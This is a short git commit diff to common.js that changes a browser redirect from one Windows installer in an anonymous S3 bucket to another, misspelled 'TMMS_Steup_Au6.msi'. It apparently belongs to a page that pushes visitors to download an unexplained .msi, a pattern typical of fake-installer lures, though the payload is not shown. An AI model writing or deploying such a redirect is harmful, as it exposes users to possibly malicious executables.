58a0e8e4a70e14e24adac1a2735a527be8f8f5db
woshiwnidaye <kwnzhwkjdhekwbsg1762@gmail.com>
2025-06-18 23:20:25 +0800

    Update common.js

--- common.js
+++ common.js
@@ -1,5 +1,5 @@
 function GetToFunction()
 {
-	var url="https://1tms11.s3.ap-southeast-2.amazonaws.com/1tms.msi";
+	var url="https://1tms11.s3.ap-southeast-2.amazonaws.com/TMMS_Steup_Au6.msi";
 	window.location=url;
 }
